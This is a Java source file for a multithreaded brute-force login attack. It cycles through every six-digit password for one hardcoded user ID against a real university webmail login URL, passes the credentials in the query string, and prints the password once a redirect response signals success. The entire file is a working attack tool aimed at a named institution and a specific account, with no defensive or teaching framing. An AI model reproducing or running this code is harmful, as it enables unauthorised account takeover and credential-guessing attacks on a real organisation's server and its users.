package main;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class Main {

	static String id = "003862";

	public static void main(String[] args) {
		long start = 1000000;
		long end = 1999999;
		int threadCount = 5;
		long countItem = (end - start) / threadCount;
		long countEndItem = (end - start) % threadCount + countItem;
		for (int i = 0; i < threadCount; i++) {
			final int j = i;
			Thread thread = new Thread(new Runnable() {

				boolean ok = false;

				public void setOk(boolean ok) {
					this.ok = ok;
				}

				@Override
				public void run() {
					if (j == threadCount - 1)
						ok(start + countItem * j, countEndItem);
					else
						ok(start + countItem * j, countItem);
				}

				private void ok(long s, long len) {
					for (long j2 = s; j2 < s + len && !ok; j2++) {
						test(test(j2));
					}
				}

				private synchronized void test(boolean test) {
					if (test && !ok) {
						setOk(true);
					}
				}

				private boolean test(long j2) {
					String password = (j2 + "").substring(1);
					try {
						URL url = new URL(
								"http://moa.jxnu.edu.cn/names.nsf?login&username=" + id + "&password=" + password);
						HttpURLConnection connection = (HttpURLConnection) url.openConnection();
						connection.setInstanceFollowRedirects(false);
						connection.setReadTimeout(3000);
						String name = Thread.currentThread().getName();
						if (connection.getResponseCode() == 302) {
							System.out.println(name + "成功的password:" + password);
							return true;
						} else {
							System.out.println(name + ":" + password);
							return false;
						}
					} catch (MalformedURLException e) {
						e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
					return false;
				}
			});
			thread.setName("第" + j + "号线程");
			thread.start();
		}
	}
}
